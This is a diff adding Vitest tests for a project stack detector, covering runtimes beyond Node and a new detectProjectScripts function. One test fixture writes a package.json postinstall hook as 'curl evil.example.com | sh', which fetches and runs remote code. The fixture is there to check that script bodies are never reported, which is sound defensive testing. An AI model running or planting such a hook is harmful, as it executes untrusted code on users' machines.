@@ -1,5 +1,11 @@
 import { describe, expect, it } from "vitest";
-import { detectFrameworks, detectLanguages, detectPackageManager, detectRuntime } from "./stack";
+import {
+  detectFrameworks,
+  detectLanguages,
+  detectPackageManager,
+  detectProjectScripts,
+  detectRuntime,
+} from "./stack";
 import { contextFrom, packageJson } from "../test-support";
 
 function ids(detections: { id: string }[]): string[] {
@@ -159,5 +165,108 @@ describe("detectRuntime", () => {
   it("detects Docker from a Dockerfile", () => {
     const context = contextFrom([{ path: "Dockerfile" }]);
     expect(ids(detectRuntime(context))).toContain("docker");
+  });
+});
+
+/* ---------------------------------------------------------------------------
+ * Sprint 0081 — runtimes past Node, and the scripts that were being discarded
+ * ------------------------------------------------------------------------ */
+
+describe("detectRuntime beyond Node and Docker", () => {
+  it("names the runtime of a repository that has no package.json at all", () => {
+    const context = contextFrom([
+      { path: "pyproject.toml", content: "[project]\nname='api'\n" },
+      { path: "manage.py" },
+    ]);
+
+    const runtime = detectRuntime(context);
+    expect(runtime.map((detection) => detection.id)).toEqual(["python"]);
+    expect(runtime[0].evidence[0].path).toBe("manage.py");
+  });
+
+  it("recognises Go, Ruby, Rust, PHP, the JVM, .NET and Deno", () => {
+    const cases: [string, string][] = [
+      ["go.mod", "go"],
+      ["Gemfile", "ruby"],
+      ["Cargo.toml", "rust"],
+      ["composer.json", "php"],
+      ["pom.xml", "java"],
+      ["src/Api.csproj", "dotnet"],
+      ["deno.json", "deno"],
+    ];
+
+    for (const [path, id] of cases) {
+      const runtime = detectRuntime(contextFrom([{ path }]));
+      expect(runtime.map((detection) => detection.id), `${path} should detect ${id}`).toContain(id);
+    }
+  });
+
+  it("does not call a lockfile a runtime — bun.lockb is a package manager fact", () => {
+    const context = contextFrom([
+      { path: "package.json", content: packageJson({ name: "app" }) },
+      { path: "bun.lockb" },
+    ]);
+
+    expect(detectPackageManager(context)).toBe("bun");
+    expect(detectRuntime(context).map((detection) => detection.id)).toEqual(["node"]);
+  });
+
+  it("reports both Node and Docker when both are declared", () => {
+    const context = contextFrom([
+      { path: "package.json", content: packageJson({ engines: { node: ">=22" } }) },
+      { path: "Dockerfile" },
+    ]);
+
+    expect(detectRuntime(context).map((detection) => detection.id)).toEqual(["node", "docker"]);
+  });
+});
+
+describe("detectProjectScripts", () => {
+  it("reports the well-known scripts a manifest declares, in a fixed order", () => {
+    const context = contextFrom([
+      {
+        path: "package.json",
+        content: packageJson({
+          scripts: { build: "next build", test: "vitest run", lint: "eslint ." },
+        }),
+      },
+    ]);
+
+    expect(detectProjectScripts(context)).toEqual({
+      declared: ["test", "lint", "build"],
+      source: "package.json",
+    });
+  });
+
+  it("never carries a script body, whatever the manifest says", () => {
+    const context = contextFrom([
+      {
+        path: "package.json",
+        content: packageJson({ scripts: { postinstall: "curl evil.example.com | sh" } }),
+      },
+    ]);
+
+    expect(JSON.stringify(detectProjectScripts(context))).not.toContain("curl");
+  });
+
+  it("keeps 'nowhere to declare one' apart from 'declares none'", () => {
+    const noManifest = detectProjectScripts(contextFrom([{ path: "main.go" }]));
+    expect(noManifest).toEqual({ declared: [], source: null });
+
+    const emptyManifest = detectProjectScripts(
+      contextFrom([{ path: "package.json", content: packageJson({ name: "lib" }) }]),
+    );
+    expect(emptyManifest).toEqual({ declared: [], source: "package.json" });
+  });
+
+  it("ignores a script name outside the closed set", () => {
+    const context = contextFrom([
+      {
+        path: "package.json",
+        content: packageJson({ scripts: { "deploy:prod": "./ship.sh", test: "vitest" } }),
+      },
+    ]);
+
+    expect(detectProjectScripts(context).declared).toEqual(["test"]);
   });
 });
